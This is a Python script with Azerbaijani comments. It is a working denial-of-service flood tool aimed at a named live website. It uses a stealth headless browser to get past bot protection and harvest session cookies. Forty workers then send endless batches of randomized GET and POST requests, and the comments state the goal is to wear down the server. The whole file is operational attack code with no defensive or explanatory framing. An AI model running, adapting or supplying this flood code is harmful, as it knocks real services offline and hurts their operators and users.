import asyncio
from playwright.async_api import async_playwright
from playwright_stealth import stealth
import httpx
import time
import random
import string

TARGET_URL = "https://streamwin.win"
WORKERS = 40  # Railway gücü üçün 40 worker ideal dır
BATCH_SIZE = 150 # Hər worker bir dəfəyə 150 sorğu atsın

def random_str(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def get_valid_session(p):
    browser = await p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
    context = await browser.new_context(
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )
    page = await context.new_page()
    await stealth(page)
    
    try:
        await page.goto(TARGET_URL, wait_until="networkidle")
        await asyncio.sleep(8)
        cookies = await context.cookies()
        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        await browser.close()
        return cookie_str, ua
    except:
        await browser.close()
        return None, None

async def attack_worker(worker_id):
    async with async_playwright() as p:
        while True:
            cookie, ua = await get_valid_session(p)
            if not cookie: continue
            
            print(f"🚀 Worker {worker_id} -> BEYPASS UĞURLU! HÜCUM ŞİDDƏTLƏNİR...")
            
            async with httpx.AsyncClient(http2=True, verify=False) as client:
                for _ in range(500): # 500 dalğa göndər, sonra yenidən bypass et
                    try:
                        tasks = []
                        for _ in range(BATCH_SIZE):
                            # Həm GET, həm POST (Serveri yormaq üçün)
                            method = random.choice(["GET", "POST"])
                            url = f"{TARGET_URL}/?{random_str()}={random_str()}"
                            headers = {
                                "User-Agent": ua,
                                "Cookie": cookie,
                                "Referer": "https://www.google.com/",
                                "X-Requested-With": "XMLHttpRequest"
                            }
                            
                            if method == "GET":
                                tasks.append(client.get(url, headers=headers, timeout=5.0))
                            else:
                                tasks.append(client.post(url, headers=headers, data={random_str(): random_str()}, timeout=5.0))
                        
                        await asyncio.gather(*tasks, return_exceptions=True)
                    except:
                        break # Bağlantı kəsilsə kuki yenilə

async def main():
    print("🔥 EXTREME RAILWAY FLOOD INITIALIZED - MAXIMUM POWER")
    # Workerləri hissə-hissə başlat (Railway CPU-sunu dondurmasın)
    for i in range(WORKERS):
        asyncio.create_task(attack_worker(i))
        await asyncio.sleep(0.5)
    
    while True: await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
